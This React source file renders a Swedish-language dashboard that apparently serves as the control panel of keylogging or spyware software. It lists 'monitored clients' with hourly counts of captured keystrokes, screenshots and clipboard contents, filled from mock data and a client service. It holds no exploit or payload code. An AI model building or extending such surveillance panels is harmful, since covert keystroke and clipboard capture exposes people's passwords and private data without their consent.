
import React from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from "@/components/ui/table";
import { Skeleton } from "@/components/ui/skeleton";
import { useQuery } from "@tanstack/react-query";
import { DashboardHeader } from "@/components/dashboard/DashboardHeader";
import { ClientCountWidget } from "@/components/dashboard/ClientCountWidget";
import { StorageWidget } from "@/components/dashboard/StorageWidget";
import { ActivityChart } from "@/components/dashboard/ActivityChart";
import { RecentActivityWidget } from "@/components/dashboard/RecentActivityWidget";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";
import { getClients } from "@/services/scriptsService";

// Mock dashboard data
const mockDashboardData = {
  totalClients: 12,
  activeClients: 5,
  totalLogs: 1458,
  storageUsed: "1.2 GB",
  latestActivity: "2025-03-18 20:15:43",
  recentActivities: [
    { id: 1, client: "wickey", type: "keystrokes", timestamp: "2025-03-18 20:15:43" },
    { id: 2, client: "desktop-hkqh9a7", type: "screenshot", timestamp: "2025-03-18 19:42:12" },
    { id: 3, client: "wickey", type: "clipboard", timestamp: "2025-03-18 18:30:55" },
    { id: 4, client: "desktop-laptop03", type: "keystrokes", timestamp: "2025-03-18 17:22:18" },
    { id: 5, client: "desktop-hkqh9a7", type: "keystrokes", timestamp: "2025-03-18 16:15:09" }
  ],
  clients: [
    { id: "1", name: "wickey", isActive: true, lastActivity: "2025-03-18 20:15:43", os: "Windows 10" },
    { id: "2", name: "desktop-hkqh9a7", isActive: true, lastActivity: "2025-03-18 19:42:12", os: "Windows 11" },
    { id: "3", name: "laptop-work01", isActive: true, lastActivity: "2025-03-18 18:10:35", os: "macOS" },
    { id: "4", name: "desktop-laptop03", isActive: true, lastActivity: "2025-03-18 17:22:18", os: "Linux" },
    { id: "5", name: "office-pc05", isActive: true, lastActivity: "2025-03-18 16:15:09", os: "Windows 10" },
    { id: "6", name: "server-room2", isActive: false, lastActivity: "2025-03-17 22:45:31", os: "Windows Server" },
    { id: "7", name: "lab-computer", isActive: false, lastActivity: "2025-03-17 20:30:14", os: "macOS" }
  ],
  activityData: [
    { name: "00:00", keystrokes: 0, screenshots: 0, clipboard: 0 },
    { name: "01:00", keystrokes: 12, screenshots: 2, clipboard: 1 },
    { name: "02:00", keystrokes: 8, screenshots: 2, clipboard: 0 },
    { name: "03:00", keystrokes: 0, screenshots: 1, clipboard: 0 },
    { name: "04:00", keystrokes: 0, screenshots: 1, clipboard: 0 },
    { name: "05:00", keystrokes: 0, screenshots: 1, clipboard: 0 },
    { name: "06:00", keystrokes: 5, screenshots: 1, clipboard: 0 },
    { name: "07:00", keystrokes: 23, screenshots: 3, clipboard: 2 },
    { name: "08:00", keystrokes: 78, screenshots: 5, clipboard: 8 },
    { name: "09:00", keystrokes: 142, screenshots: 8, clipboard: 12 },
    { name: "10:00", keystrokes: 98, screenshots: 6, clipboard: 9 },
    { name: "11:00", keystrokes: 85, screenshots: 5, clipboard: 7 },
    { name: "12:00", keystrokes: 55, screenshots: 4, clipboard: 5 },
    { name: "13:00", keystrokes: 75, screenshots: 5, clipboard: 8 },
    { name: "14:00", keystrokes: 132, screenshots: 7, clipboard: 10 },
    { name: "15:00", keystrokes: 145, screenshots: 8, clipboard: 12 },
    { name: "16:00", keystrokes: 112, screenshots: 6, clipboard: 9 },
    { name: "17:00", keystrokes: 88, screenshots: 5, clipboard: 7 },
    { name: "18:00", keystrokes: 42, screenshots: 4, clipboard: 3 },
    { name: "19:00", keystrokes: 35, screenshots: 3, clipboard: 2 },
    { name: "20:00", keystrokes: 22, screenshots: 2, clipboard: 1 },
    { name: "21:00", keystrokes: 15, screenshots: 2, clipboard: 1 },
    { name: "22:00", keystrokes: 5, screenshots: 1, clipboard: 0 },
    { name: "23:00", keystrokes: 2, screenshots: 1, clipboard: 0 }
  ]
};

// Enhanced fetchDashboardData function that uses mock data instead of real API
const fetchDashboardData = async () => {
  try {
    console.log("Fetching dashboard data (using mock data)");
    
    // Get real clients from the scriptsService if possible
    try {
      const realClients = await getClients();
      if (realClients && realClients.length > 0) {
        // Map real clients to our dashboard format
        mockDashboardData.clients = realClients.map(client => ({
          id: client.id,
          name: client.name,
          isActive: new Date(client.lastActivity).getTime() > (Date.now() - 30 * 60 * 1000),
          lastActivity: client.lastActivity,
          os: client.system || "Unknown"
        }));
        
        // Update counts
        mockDashboardData.totalClients = realClients.length;
        mockDashboardData.activeClients = mockDashboardData.clients.filter(c => c.isActive).length;
      }
    } catch (error) {
      console.warn("Could not fetch real clients, using mock data", error);
    }
    
    return mockDashboardData;
  } catch (error) {
    console.error("Error in dashboard data function:", error);
    toast.error("Kunde inte hämta dashboard-data");
    return mockDashboardData; // Return mock data anyway to avoid crashes
  }
};

export default function Dashboard() {
  const { data, isLoading, error } = useQuery({
    queryKey: ['dashboardData'],
    queryFn: fetchDashboardData,
    retry: 1,
    staleTime: 60000, // 1 minute
  });

  if (error) {
    console.error("Error fetching dashboard data:", error);
    toast.error("Kunde inte hämta dashboard-data");
  }

  // Use data with fallback to empty values
  const dashboardData = data || mockDashboardData;

  return (
    <div className="h-full flex-1 flex-col space-y-8 p-8 md:flex">
      <DashboardHeader />
      
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-4">
        <ClientCountWidget 
          isLoading={isLoading} 
          totalClients={dashboardData.totalClients} 
          activeClients={dashboardData.activeClients} 
        />
        
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Totalt antal loggar</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-6 w-20" />
            ) : (
              <div className="text-2xl font-bold">{dashboardData.totalLogs}</div>
            )}
          </CardContent>
        </Card>
        
        <StorageWidget isLoading={isLoading} storageUsed={dashboardData.storageUsed} />
        
        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Senaste aktivitet</CardTitle>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <Skeleton className="h-6 w-36" />
            ) : (
              <div className="text-sm font-medium">{dashboardData.latestActivity}</div>
            )}
          </CardContent>
        </Card>
      </div>
      
      <div className="grid gap-4 md:grid-cols-2 lg:grid-cols-7">
        <Card className="col-span-4">
          <CardHeader>
            <CardTitle>Aktivitetsöversikt (24 timmar)</CardTitle>
          </CardHeader>
          <CardContent className="pl-2">
            <ActivityChart data={dashboardData.activityData} />
          </CardContent>
        </Card>
        
        <Card className="col-span-3">
          <CardHeader>
            <CardTitle>Senaste aktiviteter</CardTitle>
          </CardHeader>
          <CardContent>
            <RecentActivityWidget activities={dashboardData.recentActivities} isLoading={isLoading} />
          </CardContent>
        </Card>
      </div>
      
      <Card>
        <CardHeader>
          <CardTitle>Klientöversikt</CardTitle>
          <CardDescription>
            Lista över övervakade klienter och deras status
          </CardDescription>
        </CardHeader>
        <CardContent>
          <ScrollArea className="h-[300px] w-full">
            <Table>
              <TableHeader>
                <TableRow>
                  <TableHead>Klient</TableHead>
                  <TableHead>Status</TableHead>
                  <TableHead>Senaste aktivitet</TableHead>
                  <TableHead>OS</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {isLoading ? (
                  Array.from({ length: 5 }).map((_, i) => (
                    <TableRow key={i}>
                      <TableCell><Skeleton className="h-4 w-32" /></TableCell>
                      <TableCell><Skeleton className="h-4 w-16" /></TableCell>
                      <TableCell><Skeleton className="h-4 w-36" /></TableCell>
                      <TableCell><Skeleton className="h-4 w-20" /></TableCell>
                    </TableRow>
                  ))
                ) : (
                  dashboardData.clients.map((client) => (
                    <TableRow key={client.id}>
                      <TableCell className="font-medium">{client.name}</TableCell>
                      <TableCell>
                        <Badge variant={client.isActive ? "success" : "destructive"}>
                          {client.isActive ? "Online" : "Offline"}
                        </Badge>
                      </TableCell>
                      <TableCell>{client.lastActivity}</TableCell>
                      <TableCell>{client.os}</TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  );
}
